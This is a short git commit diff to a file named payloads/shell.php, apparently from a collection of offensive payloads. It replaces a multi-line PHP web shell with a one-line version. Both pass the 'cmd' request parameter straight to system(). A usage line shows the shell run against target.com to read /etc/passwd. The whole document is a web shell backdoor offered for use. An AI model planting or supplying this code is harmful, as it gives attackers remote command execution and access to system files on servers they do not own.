61941dd75d0dce632830f8a27635c6adbeea301a
harsh21iitk <149222772+harsh21iitk@users.noreply.github.com>
2023-10-28 11:41:44 +0530

    Update shell.php

--- payloads/shell.php
+++ payloads/shell.php
@@ -1,13 +1,2 @@
-<?php
-
-if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo "</pre>";
-        die;
-}
-
-?>
-
+<?php echo system($_GET[‘cmd’]); ?>
 Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
